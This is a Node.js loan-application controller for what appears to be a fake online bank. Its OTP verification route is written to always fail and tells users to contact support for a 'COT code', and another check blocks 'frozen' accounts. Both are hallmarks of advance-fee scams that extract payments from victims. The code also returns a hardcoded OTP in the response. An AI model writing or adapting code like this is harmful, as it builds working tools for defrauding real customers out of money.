const { pool } = require('../config/database');

// Apply for loan
const applyForLoan = async (req, res) => {
  const userId = req.user.id;
  const { type, amount, term, purpose } = req.body;

  try {
    // Check if user account is frozen
    const userResult = await pool.query(
      'SELECT is_frozen FROM users WHERE id = $1',
      [userId]
    );

    if (userResult.rows[0].is_frozen) {
      return res.status(400).json({ error: 'Your account is frozen. Please contact support.' });
    }

    // Insert loan application
    const result = await pool.query(
      `INSERT INTO loans (user_id, type, amount, term, purpose, status) 
       VALUES ($1, $2, $3, $4, $5, 'pending') RETURNING *`,
      [userId, type, amount, term, purpose]
    );

    // For demo, generate OTP (in real app, this would be sent via email/SMS)
    const otp = '123456';

    res.json({
      message: 'Loan application submitted successfully. OTP verification required.',
      loanId: result.rows[0].id,
      otp: otp // In production, this would not be sent in response
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
};

// Get user loans
const getUserLoans = async (req, res) => {
  const userId = req.user.id;

  try {
    const result = await pool.query(
      'SELECT * FROM loans WHERE user_id = $1 ORDER BY created_at DESC',
      [userId]
    );

    res.json(result.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
};

// Get active loans (for profile page)
const getActiveLoans = async (req, res) => {
  const userId = req.user.id;

  try {
    const result = await pool.query(
      'SELECT * FROM loans WHERE user_id = $1 AND status = $2',
      [userId, 'approved']
    );

    res.json(result.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
};

// Verify loan OTP (ALWAYS FAILS as per your frontend requirement)
const verifyLoanOTP = async (req, res) => {
  const { otp } = req.body;

  try {
    // ALWAYS RETURN ERROR - no successful loan applications
    res.status(400).json({ 
      error: 'The code you inserted is invalid. Please contact support to request your COT code.'
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
};

module.exports = {
  applyForLoan,
  getUserLoans,
  getActiveLoans,
  verifyLoanOTP
};